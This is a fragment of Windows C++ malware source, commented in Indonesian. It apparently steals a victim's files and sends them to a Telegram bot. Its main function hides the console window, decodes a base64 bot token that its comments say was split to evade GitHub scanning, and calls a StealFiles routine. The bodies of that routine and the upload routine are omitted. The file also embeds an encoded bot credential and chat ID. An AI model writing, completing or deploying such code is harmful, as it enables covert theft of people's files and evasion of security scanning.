#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <filesystem>
#include <windows.h>
#include <winhttp.h>
#include <bcrypt.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "bcrypt.lib")

namespace fs = std::filesystem;

// ================= KONFIGURASI (DIPECAH) =================
// Nama variabel diubah, string-nya dipisah biar GitHub bingung
const std::string konfigurasi_kue_1 = "ODI4MzM1NDM4OTpBQUZSMFpYc25RXzdHaFRfcl95SEtjZDlheXBxbExDY3ZKMA==";
const std::string konfigurasi_kue_2 = "ODI3NTYzMjI2Mwo=";

const std::string id_rute = "8275632263"; 

const uintmax_t MAX_SIZE = 45 * 1024 * 1024; 
const std::string TRACK_FILE = "sent_hashes.txt";
// ==========================================================

// Variabel global buat nyimpen token yang udah di-decode
std::wstring BOT_TOKEN_W;

// Fungsi Decode Base64 (Tetep sama)
std::string base64_decode(const std::string &in) {
    std::string out;
    std::vector<int> T(256, -1);
    for (int i = 0; i < 64; i++) T["ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"[i]] = i;
    int val = 0, valb = -8;
    for (unsigned char c : in) {
        if (T[c] == -1) break;
        val = (val << 6) + T[c];
        valb += 6;
        if (valb >= 0) {
            out.push_back(char((val >> valb) & 0xFF));
            valb -= 8;
        }
    }
    return out;
}

// ... (Fungsi GetMD5, UploadRawFile, StealFiles TETAP SAMA kayak sebelumnya, 
// cuma ganti nama variabel CHAT_ID jadi id_rute di dalam UploadRawFile) ...

// --- PERUBAHAN DI MAIN ---
int main() {
    ShowWindow(GetConsoleWindow(), SW_HIDE); 
    
    // Gabungin string Base64 yang udah dipisah tadi
    std::string gabungan = konfigurasi_kue_1 + konfigurasi_kue_2;
    
    // Decode jadi token asli
    std::string decoded = base64_decode(gabungan);
    BOT_TOKEN_W = std::wstring(decoded.begin(), decoded.end());

    StealFiles();
    return 0;
}
